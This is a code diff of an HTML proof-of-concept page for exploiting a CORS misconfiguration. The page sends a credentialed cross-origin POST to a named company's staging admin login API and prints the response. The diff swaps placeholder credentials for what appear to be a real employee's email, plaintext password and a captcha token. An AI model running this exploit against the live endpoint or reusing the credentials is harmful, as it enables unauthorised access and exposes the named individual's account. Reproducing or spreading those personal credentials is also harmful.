@@ -2,17 +2,15 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>CORS POST Exploitation Test</title>
+  <title>CORS Exploitation PoC - POST Request</title>
   <style>
     body {
       font-family: Arial, sans-serif;
       margin: 40px;
     }
-    input, textarea {
-      width: 600px;
-    }
     textarea {
-      height: 150px;
+      width: 700px;
+      height: 200px;
     }
     pre {
       border: 1px solid #ccc;
@@ -23,25 +21,30 @@
   </style>
 </head>
 <body>
-  <h2>CORS POST Exploitation PoC</h2>
-  <p>This page sends a cross-origin POST request to the target URL. The <code>Origin</code> header will automatically be set to this GitHub Pages site.</p>
+  <h2>CORS Exploitation PoC (POST)</h2>
+  <p>
+    This page sends a POST request to the target URL below.<br>
+    <strong>Origin:</strong> This site (<code>https://rottenpot.github.io</code>)
+  </p>
 
-  <label>Target URL:</label><br>
-  <input
-    type="text"
-    id="targetUrl"
-    value="https://staging-elb.basecamp.invesco.co.uk/backend-proxy/adm/api/v1/login"
-  ><br><br>
-
-  <label>Request Body (JSON):</label><br>
-  <textarea id="requestBody">
-{
-  "username": "testuser",
-  "password": "testpassword"
-}
-  </textarea><br><br>
-
-  <button onclick="exploit()">Send POST Request</button>
+  <div>
+    <label>Target URL:</label><br>
+    <input
+      type="text"
+      id="targetUrl"
+      value="https://staging-elb.basecamp.invesco.co.uk/backend-proxy/adm/api/v1/login"
+      style="width: 700px;"
+    >
+  </div>
+  <br>
+  <div>
+    <label>Request Body (JSON):</label><br>
+    <textarea id="requestBody">
+{"email":"SyedAhsan.Rizvi@invesco.com","password":"Udit@12345","captcha":"HFdXB0ZglQYwgieE9BW1pQWhl-HxAyXTI5ER4ZBDEOInB-LRMENGkWIidNVjR9YTFRYz4cBhQHdxQKf0BFdWt0KhJqBAZKHyYANGtHR2pAVTtzdUgnWncqTzp2QUdQR1JaFytDHnF0IzhjS0BdKA1WIi96Tkl0CgUjNSN8Zg4gLg1hahhNYXZPBkY9ZnBoTWA2YGsYU2lhNHB0PxBiNg8BUzAnDHYLUgVdRn5vAFJmUkIBAGJjZHoxYU9uS35hA0EgDF5ycWtqAHJAQFc7FCY-a3ZxVgIBDWRiawREYTF-NWkXTn1hTnNIBihBf21YZkVlWmZ8MlBEF1FJVG1Ea25yfgh7TwBpf1JCfB9HSUFMThcLL3ZCdF91SExFSRJvWnoGYSlmQFkGVlhSCV5fXlRjZGpzTkZ0A2FzIWtwa05PBFxOJnV7QXcDCVFXW3ADWnlXVnBUQzIyclB0UBwERFl_JDJ4UX9TaX9lWllmHERjBGpzJ3NQUGUNVgs5FXwwX2hYahgSAjhPZjEtXmBkN14BX296VzBuTDRzJlVfWlB0Zlh8NFtDTVlJdWdJcQVre0IffndsWjpvUEY8YEkOVSEPTGRwZ2tFDVtFdQpAaClSWWF1cBUFb1VVAgp5UUlvTm5_V0VsMk5EGXJDcEZjbUZbeHEnWUxxWEhKQGUNXk5hJhMKbRt2S08FZ2NNaS9-ZBILQndDX1NzelJgOU1ZQytJX2B8bmR-eGUSIlMfWFdHfFAhJnIVX2MDbktKQndSRkdcazpnfFRLbTlsRWxZeVh7cw14f0xrV2BAd0NwAWxnFnhyLEBSYgkFbAQbXXJXcVR8FkkVY2FCKA4eaGAXSV9eXiV6fXJddSBGRH5ZR0V2a1lsH2NBbklFXGZuQABPe201MnhUemxMA0ZCbVQGSVULEnBOTUJZeHVZZg9_dmwpU1wQeXNaZ2tjCHJ0cnA_ZX8jQEsHbg4rHld4T15aXUsFbE41YlEteVRtd3BTYnB9ZyY8UUEWZGlsc3NAUQJiSjtVJn1DAVhqfWZcdHsIOH5kbXtdbVM9dWJwCix5a0tLBSQoLXgnaiQvSSNsZFwAWkUBSgZZezB5RHgcR1F8d3UlDRpoaGBgalNCWGlMOUVTIhcmM1IYZ0FMfUwaRG9VfC49XEsTAlt9dA8Ra3VNbURjIFN5CAprfhJtJG0eQnBTf2tTLEp6OGEqOQxeFg07blcOBHMLSW5KY3FyZnUyY0YdRy19eH14BFpbXxEfd3x7Tl9PbUtjUgdgCnFIYURjQ05rSURaJk9hIldVaUZTXAVHQ1gnSwEteDZDYB1FCFBzYwcWYxRIdmNnal5GCnNJJgFNZCNcc2hdcGF6fGxbTUlTPEVlTU1jWHsCFmh2Q0B2fX8iVw8kQXACc2V9d2FeQ3BZWxtoAl5wa3J2flB0PUVdagpJV3EyZQNdIGlPAE4jL0g9VFh3Q1R_ewoqSFlpbWBWfh9GUlJqKCh2Ukx4Mh8CaHxweQBbSnAMYDZDVXtWbl8BCEVjXlRpfVNFaVVPF0QCPUZicHoZQ3Z8JUs1DHRxfU1TfERlWlJhDRBNd3FSbG9yRnBqdUd2CAMjQhAxWW59RnJTBHpkCV9FQV0CZAZnWmYrZFtGVntnCRZ3REsJeggKWFBWNR9ZdGZDSDYJXBIHSVJHBFt5VUdcPFEHTUxDNhJGcEFLYEI0cyxCdVdnc31eV0EaUTsDWExRTHh0XkhHDiFtfVtFaktsQ0dgTn5EJRVfclJYeg4hXEJZLnBCMkN0LRxvcl9eQHF5Y3J4cmk2dVtjUldWXhIUcGF-T3xyQ292dSB6ZXZwfX5Ke0lxXGhXJBp1SVpTPxF_dQJ8Q1Y0AktEGWBWXV1dZwIKbmAPDnVVAmVGcF0BfHpaU1IvQ0JNRl5fSGVWHxNvYBVfdXthfn1JMn1YEV9SRkxvYndWYVkUXX1ZZ0djHFdqVD1OeTsgc3BxSXlldndbehYJdwprf0lmel9-fUZxP05CVF5XN0tRTFhDYFAeGGxgGVBrdSB-U2s1ASMkciMtZwN7TkdfQCxjZWZAUUVSX3NlQ3kjfnRfHl9AZmRbIUBoDA9aNGl1Wm1xB194AA0DfAFDUGI7VW5VXkpvexIPa2xtQGEKf0FvSiB2ZBd8aCJ7exxyAXwIA1JGdEtxPElRDEBnCl8pBTJwYmBeR0ZHQ1cUZiUAVFoyS1cMdkh3dTsdb0kqaEAdbWlfOU9eDDRPSEg_aHRHf3x0cXBGCgheKmldV1J8Zl51TnFFL3E-SxsUa2NhQhYJeWpSXF1jfGVAeAtrdXFHfikYbXltQQFtIhgASkpLZ0tFYE1lf0d3DmlzR04WW2VwQ281T1AgcGMqa2hFRHR5SAV5BkZ2aT8VTWBoY31PChddb2BQdkZHWlJsAWVeHA9Xcx5tAgMHdks7f19nRnViVGNlAEJcYHcCakVmV39QR1ByDBxgfi9TYWp_XlZnBAMMGRpoNE9FYlUcamZ1USwEdXgWFDRqBSV1cFEFXXx_dVZXYHNTdVdEQStOAGFpXH9KcHtiXmd_KhtNbkhwf01fWCJXC1MqGXInUntiXGJfDXYvbHNUcTN0cVdCQFh1RQEkLRFAZ3pBf1hTSgxZd3dJeFxqDEddQgJQBllZW3pqQGJmE25dT21xFnVcc0B_AGNwLH4Ka3wmUl5Yen5cWVVMcxtaAkp8RU5rbW9hPGdHFS1QF0dUV1VEfFdJcAVNPGV_WX4Mel4GRHs9GkdtRnpKbFVQAHtXUjhzdURsWUICc0wmDRJbcCF0eHMDVxxYUVh3HF5aMU5SOllDYgBOQF41PUlvZUheYzAjJh53fQ"}
+    </textarea>
+  </div>
+  <br>
+  <button onclick="exploit()">Send Request (POST)</button>
 
   <pre id="output"></pre>
 
@@ -54,7 +57,7 @@
 
       const xhr = new XMLHttpRequest();
       xhr.open('POST', url, true);
-      xhr.withCredentials = true; // include cookies if any
+      xhr.withCredentials = true;
       xhr.setRequestHeader('Content-Type', 'application/json');
 
       xhr.onreadystatechange = function() {
@@ -63,7 +66,6 @@
             'Status: ' + xhr.status + '\n\nResponse:\n' + xhr.responseText;
         }
       };
-
       xhr.send(body);
     }
   </script>
